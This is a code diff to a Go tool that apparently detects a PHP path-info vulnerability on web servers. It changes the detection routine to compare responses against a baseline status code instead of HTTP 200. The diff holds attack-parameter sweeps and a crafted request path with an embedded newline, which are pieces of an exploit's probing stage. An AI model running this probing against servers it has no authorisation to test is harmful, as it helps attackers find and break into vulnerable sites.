@@ -4,7 +4,6 @@ import (
 	"errors"
 	"fmt"
 	"log"
-	"net/http"
 	"os"
 	"sort"
 	"strings"
@@ -31,7 +30,12 @@ func (ap *AttackParams) String() string {
 
 func Detect(requester *Requester, method *DetectMethod, hints *AttackParams, onlyQSL bool) (*AttackParams, error) {
 	var qslCandidates []int
-
+	baseResp, _, err := requester.Request("/pathinfo", &AttackParams{MinQSL, 1})
+	if err != nil {
+		return nil, fmt.Errorf("error while doing first request: %v", err)
+	}
+	baseStatus := baseResp.StatusCode
+	log.Printf("Base status code is %#v", baseStatus)
 	if hints.QueryStringLength != 0 {
 		if onlyQSL {
 			return nil, errors.New("only-qsl specified with --qsl, nothing to do")
@@ -46,7 +50,7 @@ func Detect(requester *Requester, method *DetectMethod, hints *AttackParams, onl
 			if err != nil {
 				return nil, fmt.Errorf("error for %#v: %v", ap, err)
 			}
-			if resp.StatusCode != http.StatusOK {
+			if resp.StatusCode != baseStatus {
 				log.Printf("Status code %v for qsl=%v, adding as a candidate", resp.StatusCode, qsl)
 				qslCandidates = append(qslCandidates, qsl)
 			}
@@ -67,7 +71,7 @@ func Detect(requester *Requester, method *DetectMethod, hints *AttackParams, onl
 	}
 
 	for try := 0; try < 10; try++ {
-		if err := SanityCheck(requester, method); err != nil {
+		if err := SanityCheck(requester, method, baseStatus); err != nil {
 			return nil, fmt.Errorf("sanity check failed: %v", err)
 		}
 	}
@@ -95,7 +99,7 @@ func Detect(requester *Requester, method *DetectMethod, hints *AttackParams, onl
 				if err != nil {
 					return nil, fmt.Errorf("error for %#v: %v", params, err)
 				}
-				if resp.StatusCode != http.StatusOK {
+				if resp.StatusCode != baseStatus {
 					log.Printf("Status code %v for %#v", resp.StatusCode, params)
 				}
 
@@ -110,7 +114,7 @@ func Detect(requester *Requester, method *DetectMethod, hints *AttackParams, onl
 	return nil, fmt.Errorf("not vulnerable or other failure, IDK")
 }
 
-func SanityCheck(requester *Requester, method *DetectMethod) error {
+func SanityCheck(requester *Requester, method *DetectMethod, baseStatus int) error {
 	resp, data, err := requester.Request("/PHP\nSOSAT", &AttackParams{
 		QueryStringLength: MaxQSL,
 		PisosLength:       MaxPisosLength,
@@ -119,8 +123,8 @@ func SanityCheck(requester *Requester, method *DetectMethod) error {
 		return err
 	}
 
-	if resp.StatusCode != http.StatusOK {
-		return fmt.Errorf("invalid status code when checking path_info: %v (must be 200), maybe PATH_INFO not allowed", resp.StatusCode)
+	if resp.StatusCode != baseStatus {
+		return fmt.Errorf("invalid status code when checking path_info: %v (must be %v)", resp.StatusCode, baseStatus)
 	}
 
 	if method.Check(resp, data) {
